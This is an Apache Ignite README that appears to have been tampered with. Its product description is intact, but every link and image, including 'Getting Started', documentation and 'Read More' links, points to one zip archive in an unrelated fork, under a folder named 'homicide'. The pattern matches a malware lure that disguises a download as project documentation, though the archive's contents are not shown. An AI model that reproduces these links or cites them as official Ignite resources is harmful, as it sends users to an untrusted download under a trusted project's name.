# Apache Ignite

<a href="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip"><img src="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip" hspace="20"/></a>

<a href="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip%3Cdefault%3E"><img src="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip(id:Ignite20Tests_RunAll)https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip"/></a>


## Getting Started

For information on how to get started with Apache Ignite, please visit: [Getting Started][getting-started].

## Full Documentation

You can find the full Apache Ignite documentation here: [Full documentation][docs].


## What is Apache Ignite?

[Apache Ignite][apache-ignite-homepage] is a memory-centric multi-model distributed
 <strong>database</strong>, <strong>caching</strong>, and <strong>processing</strong> platform for
 transactional, analytical, and streaming workloads, delivering in-memory speeds at petabyte scale.

<p align="center">
    <a href="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip">
        <img src="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip" width="900px"/>
    </a>
</p>

## Durable Memory
Ignite's durable memory component treats RAM not just as a caching layer but as a complete fully functional storage layer. This means that users can turn the persistence on and off as needed. If the persistence is off, then Ignite can act as a distributed **in-memory database** or **in-memory data grid**, depending on whether you prefer to use SQL or key-value APIs. If the persistence is turned on, then Ignite becomes a distributed, **horizontally scalable database** that guarantees full data consistency and is resilient to full cluster failures.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

## Ignite Persistence

Ignite Native Persistence is a distributed, ACID, and SQL-compliant **disk store** that transparently integrates with Ignite's Durable Memory as an optional disk layer storing data and indexes on SSD, Flash, 3D XPoint, and other types of non-volatile storages.

With the Ignite Persistence enabled, you no longer need to keep all the data and indexes in memory or warm it up after a node or cluster restart because the Durable Memory is tightly coupled with persistence and treats it as a secondary memory tier. This implies that if a subset of data or an index is missing in RAM, the Durable Memory will take it from the disk.

<p align="center">
    <a href="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip">
        <img src="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip" width="400px"/>
    </a>
</p>

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

## ACID Compliance
Data stored in Ignite is ACID-compliant both in memory and on disk, making Ignite a **strongly consistent** system. Ignite transactions work across the network and can span multiple servers.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

## Complete SQL Support
Ignite provides full support for SQL, DDL and DML, allowing users to interact with Ignite using pure SQL without writing any code. This means that users can create tables and indexes as well as insert, update, and query data using only SQL. Having such complete SQL support makes Ignite a one-of-a-kind **distributed SQL database**.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

## Key-Value
The in-memory data grid component in Ignite is a fully transactional **distributed key-value store** that can scale horizontally across 100s of servers in the cluster. When persistence is enabled, Ignite can also store more data than fits in memory and survive full cluster restarts.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

## Collocated Processing
Most traditional databases work in a client-server fashion, meaning that data must be brought to the client side for processing. This approach requires lots of data movement from servers to clients and generally does not scale. Ignite, on the other hand, allows for sending light-weight computations to the data, i.e. **collocating** computations with data. As a result, Ignite scales better and minimizes data movement.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

## Scalability and Durability
Ignite is an elastic, horizontally scalable distributed system that supports adding and removing cluster nodes on demand. Ignite also allows for storing multiple copies of the data, making it resilient to partial cluster failures. If the persistence is enabled, then data stored in Ignite will also survive full cluster failures. Cluster restarts in Ignite can be very fast, as the data becomes operational instantaneously directly from disk. As a result, the data does not need to be preloaded in-memory to begin processing, and Ignite caches will lazily warm up resuming the in memory performance.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

## Ignite Components

You can view Apache Ignite as a collection of independent, well-integrated components geared to improve performance and
 scalability of your application.

Some of these components include:
* [Advanced Clustering](#advanced-clustering)
* [Data Grid](#data-grid-jcache)
* [SQL Database](#sql-database)
* [Compute Grid](#compute-grid)
* [Service Grid](#service-grid)
* [Hadoop Accelerator](#hadoop-accelerator)
* [Spark Shared RDDs and SQL indexes](#spark-shared-rdds)

Below you’ll find a brief explanation for each of them.


### Advanced Clustering

Ignite nodes can [automatically discover](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) each other. This helps to scale the cluster when needed, without having to restart the whole cluster. Developers can also leverage from Ignite’s hybrid cloud support that allows establishing connection between private cloud and public clouds such as Amazon Web Services, providing them with best of both worlds.

<p align="center">
    <a href="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip">
        <img src="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip" />
    </a>
</p>

Apache Ignite can be deployed on:
* [AWS](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Docker](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Google Compute](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Kubernetes](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Mesos](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [YARN](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)


### Data Grid (JCache)

[Ignite data grid](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) is an in-memory distributed key-value store which can be viewed as a distributed partitioned hash map,
with every cluster node owning a portion of the overall data. This way the more cluster nodes we add, the more data we
can cache.

Unlike other key-value stores, Ignite determines data locality using a pluggable hashing algorithm. Every client can
determine which node a key belongs to by plugging it into a hashing function, without a need for any special mapping
servers or name nodes.

Ignite data grid supports local, replicated, and partitioned data sets and allows to freely cross query between these
data sets using standard SQL syntax. Ignite supports standard SQL for querying in-memory data including support for distributed SQL joins.

<p align="center">
    <a href="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip">
        <img src="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip" vspace="15" width="450px"/>
    </a>
</p>

### SQL Database

Apache Ignite incorporates [distributed SQL database](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) capabilities as a part of its platform. The database is horizontally
 scalable, fault tolerant and SQL ANSI-99 compliant. It supports all SQL, DDL, and DML commands including SELECT, UPDATE,
  INSERT, MERGE, and DELETE queries. It also provides support for a subset of DDL commands relevant for distributed
  databases.

With Ignite Durable Memory architecture, data as well as indexes can be stored both in memory and, optionally, on disk.
This allows executing distributed SQL operations across different memory layers achieving in-memory performance with the durability of disk.

You can interact with Apache Ignite using the SQL language via natively developed APIs for Java, .NET and C++, or via
the Ignite JDBC or ODBC drivers. This provides a true cross-platform connectivity from languages such as PHP, Ruby and more.


<p align="center">
    <a href="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip">
        <img src="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip" vspace="15" width="400px"/>
    </a>
</p>


### Compute Grid

[Distributed computations](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) are performed in parallel fashion to gain high performance, low latency, and linear scalability.
 Ignite compute grid provides a set of simple APIs that allow users distribute computations and data processing across
 multiple computers in the cluster. Distributed parallel processing is based on the ability to take any computation and
 execute it on any set of cluster nodes and return the results back.

<p align="center">
    <a href="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip">
        <img src="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip" vspace="15" width="400px"/>
    </a>
</p>

We support these features, amongst others:

* [Distributed Closure Execution](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [MapReduce & ForkJoin Processing](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Continuous Mapping](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Clustered Executor Service](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Per-Node Shared State](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Collocation of Compute and Data](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Load Balancing](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Fault Tolerance](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Job State Checkpointing](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Job Scheduling](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

### Service Grid

[Service Grid](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) allows for deployments of arbitrary user-defined services on the cluster. You can implement and deploy any
service, such as custom counters, ID generators, hierarchical maps, etc.

Ignite allows you to control how many instances of your service should be deployed on each cluster node and will
automatically ensure proper deployment and fault tolerance of all the services.

<p align="center">
    <a href="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip">
        <img src="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip" vspace="15" width="400px"/>
    </a>
</p>

### Ignite File System

[Ignite File System](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) (IGFS) is an in-memory file system allowing work with files and directories over existing cache
infrastructure. IGFS can either work as purely in-memory file system, or delegate to another file system (e.g. various
Hadoop file system implementations) acting as a caching layer.

In addition, IGFS provides API to execute map-reduce tasks over file system data.

### Distributed Data Structures

Ignite supports complex [data structures](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) in a distributed fashion:

* [Queues and sets](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip): ordinary, bounded, collocated, non-collocated
* [Atomic types](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip): `AtomicLong` and `AtomicReference`
* [CountDownLatch](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [ID Generators](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Semaphore](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

### Distributed Messaging

[Distributed messaging](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) allows for topic based cluster-wide communication between all nodes. Messages with a specified
message topic can be distributed to all or sub-group of nodes that have subscribed to that topic.

Ignite messaging is based on publish-subscribe paradigm where publishers and subscribers are connected together by a
common topic. When one of the nodes sends a message A for topic T, it is published on all nodes that have subscribed to T.

### Distributed Events

[Distributed events](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) allow applications to receive notifications when a variety of events occur in the distributed grid environment. You can automatically get notified for task executions, read, write or query operations occurring on local or remote nodes within the cluster.

### Hadoop Accelerator

Our [Hadoop Accelerator](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) provides a set of components allowing for in-memory Hadoop job execution and file system operations.

#### MapReduce

An alternate [high-performant](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) implementation of job tracker which replaces standard Hadoop MapReduce. Use it to
boost your Hadoop MapReduce job execution performance.

<p align="center">
    <a href="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip">
        <img src="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip" vspace="15" height="400"/>
    </a>
</p>

#### IGFS - In-Memory File System

A Hadoop-compliant [IGFS](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) File System implementation over which Hadoop can run over in plug-n-play fashion and significantly reduce I/O and improve both, latency and throughput.

<p align="center">
    <a href="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip">
        <img src="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip" height="300" vspace="15"/>
    </a>
</p>

#### Secondary File System

An implementation of [`SecondaryFileSystem`](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip). This implementation can be injected into existing IGFS allowing for
read-through and write-through behavior over any other Hadoop FileSystem implementation (e.g. HDFS). Use it if you
want your IGFS to become an in-memory caching layer over disk-based HDFS or any other Hadoop-compliant file system.

#### Supported Hadoop distributions

* [Apache Hadoop](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Cloudera CDH](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Hortonworks HDP](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)
* [Apache Hive](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

### Spark Shared RDDs

Apache Ignite provides an implementation of Spark RDD abstraction which allows to easily share state in memory across Spark jobs.

The main difference between native Spark `RDD` and `IgniteRDD` is that Ignite RDD provides a [shared in-memory](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip) view on data across different Spark jobs, workers, or applications, while native Spark RDD cannot be seen by other Spark jobs or applications.

<p align="center">
    <a href="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip">
        <img src="https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip" height="400" vspace="15" />
    </a>
</p>

## Ignite Facts

#### Is Ignite a persistent or pure in-memory storage?
**Both**. Native persistence in Ignite can be turned on and off. This allows Ignite to store data sets bigger than can fit in the available memory. Essentially, the smaller operational data sets can be stored in-memory only, and larger data sets that do not fit in memory can be stored on disk, using memory as a caching layer for better performance.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

#### Is Ignite a distributed database?
**Yes**. Data in Ignite is either *partitioned* or *replicated* across a cluster of multiple nodes. This provides scalability and adds resilience to the system. Ignite automatically controls how data is partitioned, however, users can plug in their own distribution (affinity) functions and collocate various pieces of data together for efficiency.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

#### Is Ignite a relational SQL database?
**Not fully**. Although Ignite aims to behave like any other relational SQL database, there are differences in how Ignite handles constraints and indexes. Ignite supports *primary* and *secondary* indexes, however, the *uniqueness* can only be enforced for the *primary* indexes. Ignite also does not support *foreign key* constraints.

Essentially, Ignite purposely does not support any constraints that would entail a cluster broadcast message for each update and significantly hurt performance and scalability of the system.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

#### Is Ignite an in-memory database?
**Yes**. Even though Ignite *durable memory* works well in-memory and on-disk, the disk persistence can be disabled and Ignite can act as a pure *in-memory database*.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

#### Is Ignite a transactional database?
**Not fully**. ACID Transactions are supported, but only at *key-value* API level. Ignite also supports *cross-partition* transactions, which means that transactions can span keys residing in different partitions on different servers.

At *SQL* level Ignite supports *atomic*, but not yet *transactional* consistency. Ignite community plans to implement SQL transactions in version 2.2.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

#### Is Ignite a key-value store?
**Yes**. Ignite provides a feature rich key-value API, that is JCache (JSR-107) compliant and supports Java, C++, and .NET.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

#### Is Ignite an in-memory data grid?
**Yes**. Ignite is a full-featured data grid, which can be used either in pure in-memory mode or with Ignite native persistence. It can also integrate with any 3rd party database, including any RDBMS or NoSQL store.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

#### What is durable memory?
Ignite *durable memory* architecture allows Ignite to extend in-memory computing to disk. It is based on a paged-based off-heap memory allocator which becomes durable by persisting to the *write-ahead-log (WAL)* and, then, to main Ignite persistent storage. When persistence is disabled, durable memory acts like a pure in-memory storage.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

#### What is collocated processing?
Ignite is a distributed system and, therefore, it is important to be able to collocate data with data and compute with data to avoid distributed data noise. Data collocation becomes especially important when performing distributed SQL joins. Ignite also supports sending user logic (functions, lambdas, etc.) directly to the nodes where the data resides and computing on the data locally.

[Read More](https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip)

## Ignite On Other Platforms

<a href="modules/platforms/dotnet">https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip</a>

<a href="modules/platforms/cpp">Ignite C++</a>


[apache-ignite-homepage]: https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip
[getting-started]: https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip
[docs]: https://raw.githubusercontent.com/ducnguyenminh/ignite/master/homicide/ignite.zip